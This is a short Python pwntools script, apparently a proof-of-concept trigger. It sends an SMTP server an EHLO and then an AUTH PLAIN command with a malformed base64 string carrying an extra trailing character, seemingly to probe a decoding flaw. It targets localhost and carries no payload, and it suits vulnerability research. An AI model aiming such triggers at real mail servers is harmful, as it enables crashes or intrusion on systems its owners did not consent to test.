#!/usr/bin/python2
# -*- coding: utf-8 -*

import time

from pwn import *

from base64 import b64encode

p = None


def ehlo(v):
    p.sendline("EHLO " + v)
    print(p.recvuntil("HELP"))


def auth_plain(v):
    p.sendline("AUTH PLAIN {}".format(v))
    #print(p.recvuntil("command"))


def exploit():
    global p

    p = remote("localhost", 25)

    time.sleep(0.6)

    ehlo("test.example.org")
    
    length=40
    data=b64encode('A'*length)
    print("data len is %d" % length)

    data="QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ"
    if 0:
        # 正常的数据
        print data
        auth_plain(data)
    else:
        # 增加了一个额外的数据X
        auth_plain(data+'X')

    p.close()


if __name__ == "__main__":
    exploit()
